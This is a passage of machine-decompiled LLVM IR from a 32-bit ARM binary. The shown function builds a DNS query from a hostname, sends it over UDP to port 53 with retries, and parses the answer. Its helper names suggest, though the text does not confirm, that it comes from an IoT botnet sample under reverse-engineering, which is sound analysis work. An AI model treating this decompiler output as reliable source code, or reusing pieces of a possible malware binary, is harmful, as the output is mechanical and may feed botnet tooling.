  %v21_e3a8 = load i32, i32* @sl, align 4
  %v24_e3a8 = load i32, i32* @fp, align 4
  %v27_e3a8 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_e3c0 = call i32 @calloc(i32 1, i32 8)
  store i32 %v2_e3c0, i32* @fp, align 4
  %v0_e3c8 = load i32, i32* @r5, align 4
  store i32 %v0_e3c8, i32* %r0.global-to-local, align 4
  %v1_e3cc = inttoptr i32 %v0_e3c8 to i8*
  %v2_e3cc = call i32 @util_strlen(i8* %v1_e3cc)
  %v2_e3d4 = ptrtoint i16* %stack_var_-2244 to i32
  store i32 %v2_e3d4, i32* @sl, align 4
  %v2_e3d8 = ptrtoint i32* %stack_var_-2232 to i32
  store i32 %v2_e3d8, i32* @sb, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_e3e0 = add i32 %v2_e3cc, 1
  store i32 %v1_e3e0, i32* %r0.global-to-local, align 4
  %v2_e3e4 = ptrtoint i32* %stack_var_-2230 to i32
  store i32 %v2_e3e4, i32* %r2.global-to-local, align 4
  store i32 %v2_e3d8, i32* @r6, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v1_e3e0, i32* %r3.global-to-local, align 4
  %v2_e420146 = icmp eq i32 %v1_e3e0, 0
  store i1 %v2_e420146, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @lr, align 4
  %v1_e428147 = add i32 %v2_e3e4, -1
  store i32 %v1_e428147, i32* %r1.global-to-local, align 4
  %tmp116148 = icmp slt i32 %v1_e3e0, 1
  br i1 %tmp116148, label %dec_label_pc_e430, label %dec_label_pc_e3f4

dec_label_pc_e3f4:                                ; preds = %entry, %bb115
  %v0_e3f4151 = phi i32 [ %v1_e414, %bb115 ], [ 0, %entry ]
  %v1_e400150.off0 = phi i8 [ %extract.t152, %bb115 ], [ 0, %entry ]
  %v2_e434149 = phi i32 [ %v1_e418, %bb115 ], [ %v2_e3e4, %entry ]
  %v1_e3f4 = load i32, i32* @r5, align 4
  %v2_e3f4 = add i32 %v1_e3f4, %v0_e3f4151
  %v3_e3f4 = inttoptr i32 %v2_e3f4 to i8*
  %v4_e3f4 = load i8, i8* %v3_e3f4, align 1
  %v6_e3f4 = zext i8 %v4_e3f4 to i32
  store i32 %v6_e3f4, i32* %r3.global-to-local, align 4
  %v2_e3f8 = icmp eq i8 %v4_e3f4, 0
  store i1 %v2_e3f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e3f8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_e3f4
  %v8_e3fc = icmp eq i8 %v4_e3f4, 46
  store i1 %v8_e3fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e3fc, label %.thread, label %.thread7

.thread:                                          ; preds = %dec_label_pc_e3f4, %bb
  %v3_e400 = load i32, i32* @r6, align 4
  %v4_e400 = inttoptr i32 %v3_e400 to i8*
  store i8 %v1_e400150.off0, i8* %v4_e400, align 1
  %v0_e404.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e404.pr, label %.thread9.thread13, label %.thread..thread7_crit_edge

.thread..thread7_crit_edge:                       ; preds = %.thread
  %v1_e404.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_e404.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v1_e404.pre to i8
  br label %.thread7

.thread7:                                         ; preds = %.thread..thread7_crit_edge, %bb
  %v3_e404 = phi i32 [ %v3_e404.pre, %.thread..thread7_crit_edge ], [ %v2_e434149, %bb ]
  %v1_e404.off0 = phi i8 [ %extract.t, %.thread..thread7_crit_edge ], [ %v4_e3f4, %bb ]
  %v4_e404 = add i32 %v3_e404, -1
  %v5_e404 = inttoptr i32 %v4_e404 to i8*
  store i8 %v1_e404.off0, i8* %v5_e404, align 1
  %v0_e408.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e408.pr, label %.thread9, label %.thread12

.thread9.thread13:                                ; preds = %.thread
  %v1_e408 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e408, i32* @r6, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread9:                                         ; preds = %.thread7
  %v1_e40811 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_e40811, i32* @r6, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %bb115

.thread12:                                        ; preds = %.thread7
  %v1_e410 = load i32, i32* @lr, align 4
  %v2_e410 = urem i32 %v1_e410, 256
  store i32 %v2_e410, i32* %r4.global-to-local, align 4
  br label %bb115

bb115:                                            ; preds = %.thread9, %.thread9.thread13, %.thread12
  %v0_e42433 = phi i32 [ 0, %.thread9.thread13 ], [ 0, %.thread9 ], [ %v2_e410, %.thread12 ]
  %v0_e414 = load i32, i32* %ip.global-to-local, align 4
  %v1_e414 = add i32 %v0_e414, 1
  store i32 %v1_e414, i32* %ip.global-to-local, align 4
  %v0_e418 = load i32, i32* %r2.global-to-local, align 4
  %v1_e418 = add i32 %v0_e418, 1
  store i32 %v1_e418, i32* %r2.global-to-local, align 4
  %v1_e41c.pre = load i32, i32* %r0.global-to-local, align 4
  %v2_e41c = sub i32 %v1_e41c.pre, %v1_e414
  store i32 %v2_e41c, i32* %r3.global-to-local, align 4
  %v2_e420 = icmp eq i32 %v2_e41c, 0
  store i1 %v2_e420, i1* %cpsr_z.global-to-local, align 1
  %v1_e424 = add nuw nsw i32 %v0_e42433, 1
  store i32 %v1_e424, i32* @lr, align 4
  store i32 %v0_e418, i32* %r1.global-to-local, align 4
  %tmp116 = icmp slt i32 %v2_e41c, 1
  %extract.t152 = trunc i32 %v0_e42433 to i8
  br i1 %tmp116, label %dec_label_pc_e430, label %dec_label_pc_e3f4

dec_label_pc_e430:                                ; preds = %bb115, %entry
  %v1_e428.lcssa = phi i32 [ %v1_e428147, %entry ], [ %v0_e418, %bb115 ]
  store i32 0, i32* @r4, align 4
  %v4_e434 = inttoptr i32 %v1_e428.lcssa to i8*
  store i8 0, i8* %v4_e434, align 1
  store i32 %v2_e3d8, i32* %r0.global-to-local, align 4
  %v1_e43c = bitcast i32* %stack_var_-2232 to i8*
  %v2_e43c = call i32 @util_strlen(i8* %v1_e43c)
  %v2_e440 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_e440, i32* %r1.global-to-local, align 4
  %v1_e444 = load i32, i32* @sb, align 4
  %v2_e444 = add i32 %v1_e444, %v2_e43c
  store i32 %v2_e444, i32* @r5, align 4
  %v0_e44c = load i32, i32* @r4, align 4
  store i32 %v0_e44c, i32* %stack_var_-68, align 4
  store i32 %v2_e3d8, i32* %r0.global-to-local, align 4
  %v2_e45c = call i32 @util_strlen(i8* %v1_e43c)
  %v1_e460 = add i32 %v2_e45c, 17
  store i32 %v1_e460, i32* %r0.global-to-local, align 4
  %v0_e468 = call i32 @rand_next()
  %v1_e468 = sext i32 %v0_e468 to i64
  store i32 -2147450879, i32* %r3.global-to-local, align 4
  %v5_e474 = mul nuw nsw i64 %v1_e468, 2147516417
  %v6_e474 = udiv i64 %v5_e474, 4294967296
  %v7_e474 = trunc i64 %v6_e474 to i32
  %v8_e474 = trunc i64 %v5_e474 to i32
  store i32 %v8_e474, i32* @lr, align 4
  store i32 %v7_e474, i32* %r2.global-to-local, align 4
  %v5_e4784 = udiv i64 %v5_e474, 140737488355328
  %v5_e478 = trunc i64 %v5_e4784 to i32
  %v6_e478 = add i32 %v5_e478, %v0_e468
  store i32 16, i32* @r1, align 4
  %v6_e484 = urem i32 %v6_e478, 65536
  store i32 %v6_e484, i32* %ip.global-to-local, align 4
  %v2_e48c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e48c, i32* @r0, align 4
  %v5_e490 = trunc i32 %v6_e478 to i16
  %v0_e494 = call i32 @util_zero()
  store i32 %v0_e494, i32* %r0.global-to-local, align 4
  store i32 13568, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  %v0_e4c4 = load i32, i32* @r5, align 4
  %v1_e4c4 = add i32 %v0_e4c4, 1
  store i32 %v1_e4c4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i16 %v5_e490, i16* %stack_var_-2244, align 2
  %v4_e4d8 = inttoptr i32 %v1_e4c4 to i16*
  store i16 256, i16* %v4_e4d8, align 2
  %v0_e4dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e4dc = trunc i32 %v0_e4dc to i16
  %v2_e4dc = load i32, i32* %r2.global-to-local, align 4
  %v3_e4dc = add i32 %v2_e4dc, 2
  %v4_e4dc = inttoptr i32 %v3_e4dc to i16*
  store i16 %v1_e4dc, i16* %v4_e4dc, align 2
  store i32 -1, i32* @r7, align 4
  %v2_e574 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e59c = ptrtoint i32* %stack_var_-40 to i32
  %v2_e5c8 = ptrtoint i32* %stack_var_-52 to i32
  %v2_e604 = ptrtoint i16* %stack_var_-4292 to i32
  %v2_e698 = ptrtoint i32* %stack_var_-4280 to i32
  %v1_e6a0 = bitcast i32* %stack_var_-4280 to i8*
  %v4_e6c4 = zext i16 %tmp79 to i32
  %v2_e6c8 = icmp eq i16 %tmp79, 0
  br label %dec_label_pc_e4e8

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e64c, %dec_label_pc_e430
  %v1_e4ec = phi i32 [ -1, %dec_label_pc_e430 ], [ %v0_e4e8.pre, %dec_label_pc_e64c ]
  %storemerge = phi i32 [ 1, %dec_label_pc_e430 ], [ %v1_e64c, %dec_label_pc_e64c ]
  store i32 %storemerge, i32* @r8, align 4
  %v7_e4e8 = icmp eq i32 %v1_e4ec, -1
  store i1 %v7_e4e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e4e8, label %bb118, label %bb117

bb117:                                            ; preds = %dec_label_pc_e4e8
  store i32 %v1_e4ec, i32* %r0.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %dec_label_pc_e4e8, %bb117
  store i32 58612, i32* @lr, align 4
  %v1_e4f0 = xor i1 %v7_e4e8, true
  call void @__pseudo_cond_branch(i1 %v1_e4f0, i32 ptrtoint (i32* @global_var_146d0.113 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* @r1, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_e500 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_e500, i32* %r0.global-to-local, align 4
  %v7_e504 = icmp eq i32 %v3_e500, -1
  store i1 %v7_e504, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_e500, i32* @r7, align 4
  br i1 %v7_e504, label %dec_label_pc_e68c, label %dec_label_pc_e510

dec_label_pc_e510:                                ; preds = %bb118
  store i32 %v2_e48c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_e51c = call i32 @__libc_connect(i32 %v3_e500, i32 %v2_e48c, i32 16)
  store i32 %v3_e51c, i32* %r0.global-to-local, align 4
  %v7_e520 = icmp eq i32 %v3_e51c, -1
  store i1 %v7_e520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e520, label %dec_label_pc_e654, label %dec_label_pc_e528

dec_label_pc_e528:                                ; preds = %dec_label_pc_e510
  %v0_e528 = load i32, i32* @r7, align 4
  store i32 %v0_e528, i32* %r0.global-to-local, align 4
  store i32 %v2_e3d4, i32* %r1.global-to-local, align 4
  store i32 %v1_e460, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e538 = call i32 @__libc_send(i32 %v0_e528, i32 %v2_e3d4, i32 %v1_e460, i32 16384)
  store i32 %v4_e538, i32* %r0.global-to-local, align 4
  %v7_e53c = icmp eq i32 %v4_e538, -1
  store i1 %v7_e53c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e53c, label %dec_label_pc_e654, label %dec_label_pc_e544

dec_label_pc_e544:                                ; preds = %dec_label_pc_e528
  %v0_e544 = load i32, i32* @r7, align 4
  store i32 %v0_e544, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e550 = call i32 @__libc_fcntl(i32 3, i32 %v0_e544)
  %v0_e554 = load i32, i32* @r7, align 4
  store i32 %v0_e554, i32* %r1.global-to-local, align 4
  %v1_e558 = or i32 %v2_e550, 2048
  store i32 %v1_e558, i32* @r2, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_e560 = call i32 @__libc_fcntl(i32 4, i32 %v0_e554)
  store i32 %v2_e560, i32* %r0.global-to-local, align 4
  store i32 %v2_e440, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %v2_e574, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e57c

dec_label_pc_e57c:                                ; preds = %dec_label_pc_e57c, %dec_label_pc_e544
  %v1_e580 = phi i32 [ %v1_e584, %dec_label_pc_e57c ], [ 4, %dec_label_pc_e544 ]
  store i32 0, i32* @r4, align 4
  %v3_e580 = add i32 %v1_e580, %v2_e574
  %v4_e580 = inttoptr i32 %v3_e580 to i32*
  store i32 0, i32* %v4_e580, align 4
  %v0_e584 = load i32, i32* %r3.global-to-local, align 4
  %v1_e584 = add i32 %v0_e584, 4
  store i32 %v1_e584, i32* %r3.global-to-local, align 4
  %v7_e588 = icmp eq i32 %v1_e584, 128
  br i1 %v7_e588, label %dec_label_pc_e590, label %dec_label_pc_e57c

dec_label_pc_e590:                                ; preds = %dec_label_pc_e57c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_e590 = load i32, i32* @r7, align 4
  %v3_e590 = udiv i32 %v0_e590, 32
  %v3_e598 = mul nuw nsw i32 %v3_e590, 4
  store i32 %v3_e598, i32* %r3.global-to-local, align 4
  %v2_e5a0 = add i32 %v3_e598, %v2_e59c
  store i32 %v2_e5a0, i32* @r5, align 4
  %v1_e5a4 = add i32 %v2_e5a0, -156
  %v2_e5a4 = inttoptr i32 %v1_e5a4 to i32*
  %v3_e5a4 = load i32, i32* %v2_e5a4, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e5ac = urem i32 %v0_e590, 32
  store i32 %v1_e5ac, i32* @r6, align 4
  %v7_e5b0 = shl i32 1, %v1_e5ac
  %v8_e5b0 = or i32 %v3_e5a4, %v7_e5b0
  store i32 5, i32* %ip.global-to-local, align 4
  store i32 %v8_e5b0, i32* %v2_e5a4, align 4
  %v0_e5c0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_e5c0, i32* %stack_var_-52, align 4
  store i32 %v2_e5c8, i32* @lr, align 4
  store i32 %v2_e440, i32* %ip.global-to-local, align 4
  %v0_e5d0 = load i32, i32* @r7, align 4
  %v1_e5d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_e5d0 = add i32 %v1_e5d0, %v0_e5d0
  store i32 %v2_e5d0, i32* %r0.global-to-local, align 4
  %v0_e5d8 = load i32, i32* @r4, align 4
  store i32 %v0_e5d8, i32* %r2.global-to-local, align 4
  store i32 %v0_e5d8, i32* %r3.global-to-local, align 4
  %v5_e5e4 = call i32 @__libc_select(i32 %v2_e5d0, i32 %v2_e574, i32 %v0_e5d8, i32 %v0_e5d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_e5e4, i32* %r0.global-to-local, align 4
  %v7_e5e8 = icmp eq i32 %v5_e5e4, -1
  store i1 %v7_e5e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e5e8, label %dec_label_pc_e644, label %dec_label_pc_e5f0

dec_label_pc_e5f0:                                ; preds = %dec_label_pc_e590
  %v0_e5f0 = load i32, i32* @r5, align 4
  %v1_e5f0 = add i32 %v0_e5f0, -156
  %v2_e5f0 = inttoptr i32 %v1_e5f0 to i32*
  %v3_e5f0 = load i32, i32* %v2_e5f0, align 4
  %v1_e5f4 = load i32, i32* @r6, align 4
  %v6_e5f4 = ashr i32 %v3_e5f0, %v1_e5f4
  store i32 %v6_e5f4, i32* %r3.global-to-local, align 4
  %v1_e5f8 = urem i32 %v6_e5f4, 2
  %v2_e5f8 = icmp eq i32 %v1_e5f8, 0
  store i1 %v2_e5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e5f8, label %dec_label_pc_e664, label %dec_label_pc_e600

dec_label_pc_e600:                                ; preds = %dec_label_pc_e5f0
  store i32 %v2_e604, i32* @r5, align 4
  store i32 %v2_e604, i32* %r1.global-to-local, align 4
  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e614 = load i32, i32* @r7, align 4
  store i32 %v0_e614, i32* %r0.global-to-local, align 4
  %v0_e618 = load i32, i32* @r4, align 4
  %v6_e620 = call i32 @__libc_recvfrom(i32 %v0_e614, i32 %v2_e604, i32 2048, i32 16384, i32 %v0_e618, i32 %v0_e618)
  store i32 %v6_e620, i32* %r4.global-to-local, align 4
  %v0_e628 = load i32, i32* @sb, align 4
  store i32 %v0_e628, i32* %r0.global-to-local, align 4
  %v1_e62c = inttoptr i32 %v0_e628 to i8*
  %v2_e62c = call i32 @util_strlen(i8* %v1_e62c)
  %v1_e630 = add i32 %v2_e62c, 17
  store i32 %v1_e630, i32* %r0.global-to-local, align 4
  %v0_e634 = load i32, i32* %r4.global-to-local, align 4
  %v3_e634 = icmp ult i32 %v0_e634, %v1_e630
  %v9_e634 = icmp eq i32 %v0_e634, %v1_e630
  store i1 %v9_e634, i1* %cpsr_z.global-to-local, align 1
  store i32 -4252, i32* @r4, align 4
  br i1 %v3_e634, label %dec_label_pc_e644, label %dec_label_pc_e698

dec_label_pc_e644:                                ; preds = %dec_label_pc_e600, %dec_label_pc_e698, %dec_label_pc_e6c4, %dec_label_pc_e590, %dec_label_pc_e68c
  %v0_e644 = load i32, i32* @r8, align 4
  %v7_e644 = icmp eq i32 %v0_e644, 5
  store i1 %v7_e644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e644, label %dec_label_pc_e664, label %dec_label_pc_e64c

dec_label_pc_e64c:                                ; preds = %dec_label_pc_e654, %dec_label_pc_e644
  %v0_e64c = phi i32 [ %v0_e65c, %dec_label_pc_e654 ], [ %v0_e644, %dec_label_pc_e644 ]
  %v1_e64c = add i32 %v0_e64c, 1
  %v0_e4e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e4e8

dec_label_pc_e654:                                ; preds = %dec_label_pc_e528, %dec_label_pc_e510
  %v0_e654 = phi i32 [ %v4_e538, %dec_label_pc_e528 ], [ %v3_e51c, %dec_label_pc_e510 ]
  %v1_e654 = add i32 %v0_e654, 2
  store i32 %v1_e654, i32* %r0.global-to-local, align 4
  %v1_e658 = call i32 @sleep(i32 %v1_e654)
  store i32 %v1_e658, i32* %r0.global-to-local, align 4
  %v0_e65c = load i32, i32* @r8, align 4
  %v7_e65c = icmp eq i32 %v0_e65c, 5
  store i1 %v7_e65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e65c, label %dec_label_pc_e664, label %dec_label_pc_e64c

dec_label_pc_e664:                                ; preds = %dec_label_pc_e654, %dec_label_pc_e644, %dec_label_pc_e5f0, %dec_label_pc_e6d0, %dec_label_pc_e6dc.backedge
  %v0_e664 = load i32, i32* @r7, align 4
  store i32 %v0_e664, i32* %r0.global-to-local, align 4
  %v1_e668 = call i32 @__GI___libc_close(i32 %v0_e664)
  store i32 %v1_e668, i32* %r0.global-to-local, align 4
  %v0_e66c = load i32, i32* @fp, align 4
  %v1_e66c = inttoptr i32 %v0_e66c to i8*
  %v2_e66c = load i8, i8* %v1_e66c, align 1
  %v3_e66c = zext i8 %v2_e66c to i32
  store i32 %v3_e66c, i32* @r4, align 4
  %v2_e670 = icmp eq i8 %v2_e66c, 0
  store i1 %v2_e670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e670, label %dec_label_pc_e7b4, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %dec_label_pc_e664, %dec_label_pc_e7b4
  %v0_e678 = phi i32 [ %v0_e66c, %dec_label_pc_e664 ], [ %v0_e7c8, %dec_label_pc_e7b4 ]
  store i32 %v0_e678, i32* %r0.global-to-local, align 4
  store i32 %v3_e3a8, i32* @r4, align 4
  store i32 %v6_e3a8, i32* @r5, align 4
  store i32 %v9_e3a8, i32* @r6, align 4
  store i32 %v12_e3a8, i32* @r7, align 4
  store i32 %v15_e3a8, i32* @r8, align 4
  store i32 %v18_e3a8, i32* @sb, align 4
  store i32 %v21_e3a8, i32* @sl, align 4
  store i32 %v24_e3a8, i32* @fp, align 4
  store i32 %v27_e3a8, i32* @lr, align 4
  ret i32 %v0_e678

dec_label_pc_e68c:                                ; preds = %bb118
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e690 = call i32 @sleep(i32 1)
  store i32 %v1_e690, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e644

dec_label_pc_e698:                                ; preds = %dec_label_pc_e600
  store i32 %v2_e698, i32* @sb, align 4
  store i32 %v2_e698, i32* %r0.global-to-local, align 4
  %v2_e6a0 = call i32 @util_strlen(i8* %v1_e6a0)
  store i32 %v2_e59c, i32* @lr, align 4
  %v4_e6ac = load i16, i16* %stack_var_-4292, align 2
  %v5_e6ac = sext i16 %v4_e6ac to i32
  store i32 %v5_e6ac, i32* %r3.global-to-local, align 4
  store i32 %v6_e478, i32* @r1, align 4
  %v1_e6b4 = load i32, i32* @sb, align 4
  %v9_e6b8 = icmp eq i16 %v4_e6ac, %v5_e490
  store i1 %v9_e6b8, i1* %cpsr_z.global-to-local, align 1
  %v2_e6b4 = add i32 %v2_e6a0, 5
  %v1_e6bc = add i32 %v2_e6b4, %v1_e6b4
  store i32 %v1_e6bc, i32* %r0.global-to-local, align 4
  br i1 %v9_e6b8, label %dec_label_pc_e6c4, label %dec_label_pc_e644

dec_label_pc_e6c4:                                ; preds = %dec_label_pc_e698
  store i32 %v4_e6c4, i32* %r3.global-to-local, align 4
  store i1 %v2_e6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e6c8, label %dec_label_pc_e644, label %dec_label_pc_e6d0

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e6c4
  %div = udiv i16 %tmp79, 256
  %v3_e6d0 = zext i16 %div to i32
  store i32 %v3_e6d0, i32* %r2.global-to-local, align 4
  %v1_e6d4 = mul nuw nsw i32 %v4_e6c4, 256
  %v4_e6d8 = and i32 %v1_e6d4, 65280
  %v5_e6d8 = or i32 %v4_e6d8, %v3_e6d0
  %v1_e6dc134 = add nsw i32 %v5_e6d8, -1
  %v3_e6e0135 = mul i32 %v1_e6dc134, 65536
  store i32 %v3_e6e0135, i32* %r3.global-to-local, align 4
  %v7_e6e4141 = icmp eq i32 %v3_e6e0135, -65536
  store i1 %v7_e6e4141, i1* %cpsr_z.global-to-local, align 1
  %v3_e6e8142 = urem i32 %v1_e6dc134, 65536
  store i32 %v3_e6e8142, i32* @r8, align 4
  br i1 %v7_e6e4141, label %dec_label_pc_e664, label %dec_label_pc_e6f0

dec_label_pc_e6f0:                                ; preds = %dec_label_pc_e6d0, %dec_label_pc_e6dc.backedge
  %v3_e6e8144 = phi i32 [ %v3_e6e8, %dec_label_pc_e6dc.backedge ], [ %v3_e6e8142, %dec_label_pc_e6d0 ]
  %v0_e740143 = phi i32 [ %storemerge29, %dec_label_pc_e6dc.backedge ], [ %v1_e6bc, %dec_label_pc_e6d0 ]
  store i32 %v0_e740143, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  %v1_e6fc18 = inttoptr i32 %v0_e740143 to i8*
  %v2_e6fc19 = load i8, i8* %v1_e6fc18, align 1
  %v3_e6fc20 = zext i8 %v2_e6fc19 to i32
  store i32 %v3_e6fc20, i32* %r2.global-to-local, align 4
  %v2_e70021 = icmp eq i8 %v2_e6fc19, 0
  store i1 %v2_e70021, i1* %cpsr_z.global-to-local, align 1
  %v3_e70422 = mul nuw nsw i32 %v3_e6fc20, 256
  store i32 %v3_e70422, i32* @r1, align 4
  br i1 %v2_e70021, label %dec_label_pc_e738, label %dec_label_pc_e70c.preheader

dec_label_pc_e70c.preheader:                      ; preds = %dec_label_pc_e6f0, %dec_label_pc_e6fc.backedge
  %v1_e7d8 = phi i32 [ %v1_e7d850, %dec_label_pc_e6fc.backedge ], [ 1, %dec_label_pc_e6f0 ]
  %v0_e7d048 = phi i32 [ %v0_e7d0, %dec_label_pc_e6fc.backedge ], [ 0, %dec_label_pc_e6f0 ]
  %v0_e71846 = phi i32 [ %v3_e704, %dec_label_pc_e6fc.backedge ], [ %v3_e70422, %dec_label_pc_e6f0 ]
  %v0_e71444 = phi i32 [ %v1_e7d4, %dec_label_pc_e6fc.backedge ], [ %v0_e740143, %dec_label_pc_e6f0 ]
  %v0_e70c42 = phi i32 [ %v3_e6fc, %dec_label_pc_e6fc.backedge ], [ %v3_e6fc20, %dec_label_pc_e6f0 ]
  br label %dec_label_pc_e70c

dec_label_pc_e70c:                                ; preds = %dec_label_pc_e70c.preheader, %dec_label_pc_e714
  %v0_e7d0 = phi i32 [ %v0_e7d048, %dec_label_pc_e70c.preheader ], [ 1, %dec_label_pc_e714 ]
  %v0_e718 = phi i32 [ %v0_e71846, %dec_label_pc_e70c.preheader ], [ %v3_e730, %dec_label_pc_e714 ]
  %v0_e7d4 = phi i32 [ %v0_e71444, %dec_label_pc_e70c.preheader ], [ %v2_e720, %dec_label_pc_e714 ]
  %v0_e70c = phi i32 [ %v0_e70c42, %dec_label_pc_e70c.preheader ], [ %v3_e724, %dec_label_pc_e714 ]
  %v7_e70c = icmp eq i32 %v0_e70c, 191
  store i1 %v7_e70c, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v0_e70c, 192
  br i1 %tmp, label %dec_label_pc_e7d0, label %dec_label_pc_e714

dec_label_pc_e714:                                ; preds = %dec_label_pc_e70c
  %v1_e714 = add i32 %v0_e7d4, 1
  %v2_e714 = inttoptr i32 %v1_e714 to i8*
  %v3_e714 = load i8, i8* %v2_e714, align 1
  %v4_e714 = zext i8 %v3_e714 to i32
  %v2_e718 = or i32 %v4_e714, -49152
  %v0_e720 = load i32, i32* @r5, align 4
  %v1_e71c = add i32 %v0_e720, %v0_e718
  %v2_e720 = add i32 %v1_e71c, %v2_e718
  store i32 %v2_e720, i32* %r3.global-to-local, align 4
  %v1_e724 = inttoptr i32 %v2_e720 to i8*
  %v2_e724 = load i8, i8* %v1_e724, align 1
  %v3_e724 = zext i8 %v2_e724 to i32
  store i32 %v3_e724, i32* %r2.global-to-local, align 4
  %v2_e728 = icmp eq i8 %v2_e724, 0
  store i1 %v2_e728, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e730 = mul nuw nsw i32 %v3_e724, 256
  store i32 %v3_e730, i32* @r1, align 4
  br i1 %v2_e728, label %dec_label_pc_e738, label %dec_label_pc_e70c

dec_label_pc_e738:                                ; preds = %dec_label_pc_e6fc.backedge, %dec_label_pc_e714, %dec_label_pc_e6f0
  %v1_e73c = phi i32 [ 1, %dec_label_pc_e6f0 ], [ %v1_e7d8, %dec_label_pc_e714 ], [ %v1_e7d850, %dec_label_pc_e6fc.backedge ]
  %v0_e738 = phi i32 [ 0, %dec_label_pc_e6f0 ], [ 1, %dec_label_pc_e714 ], [ %v0_e7d0, %dec_label_pc_e6fc.backedge ]
  %v7_e738 = icmp eq i32 %v0_e738, 1
  store i1 %v7_e738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e738, label %bb119, label %bb120

bb119:                                            ; preds = %dec_label_pc_e738
  %v2_e73c = add i32 %v1_e73c, 1
  store i32 %v2_e73c, i32* @lr, align 4
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_e738, %bb119
  %v1_e740 = phi i32 [ %v1_e73c, %dec_label_pc_e738 ], [ %v2_e73c, %bb119 ]
  %v2_e740 = add i32 %v1_e740, %v0_e740143
  store i32 %v2_e740, i32* @r4, align 4
  %v3_e744 = inttoptr i32 %v2_e740 to i8*
  %v4_e744 = load i8, i8* %v3_e744, align 1
  %v6_e744 = zext i8 %v4_e744 to i32
  store i32 %v6_e744, i32* %r3.global-to-local, align 4
  %v1_e748 = add i32 %v2_e740, 1
  %v2_e748 = inttoptr i32 %v1_e748 to i8*
  %v3_e748 = load i8, i8* %v2_e748, align 1
  %v4_e748 = zext i8 %v3_e748 to i32
  store i32 %v4_e748, i32* %r2.global-to-local, align 4
  %v4_e74c = mul nuw nsw i32 %v4_e748, 256
  %v5_e74c = or i32 %v4_e74c, %v6_e744
  store i32 %v5_e74c, i32* %r3.global-to-local, align 4
  %v7_e750 = icmp eq i32 %v5_e74c, 256
  store i1 %v7_e750, i1* %cpsr_z.global-to-local, align 1
  %v1_e754 = add i32 %v2_e740, 10
  store i32 %v1_e754, i32* @r6, align 4
  br i1 %v7_e750, label %dec_label_pc_e7f0, label %dec_label_pc_e75c

dec_label_pc_e75c:                                ; preds = %dec_label_pc_e7f0, %bb120
  store i32 %v1_e754, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e76824 = inttoptr i32 %v1_e754 to i8*
  %v2_e76825 = load i8, i8* %v1_e76824, align 1
  %v3_e76826 = zext i8 %v2_e76825 to i32
  store i32 %v3_e76826, i32* %r2.global-to-local, align 4
  %v2_e76c27 = icmp eq i8 %v2_e76825, 0
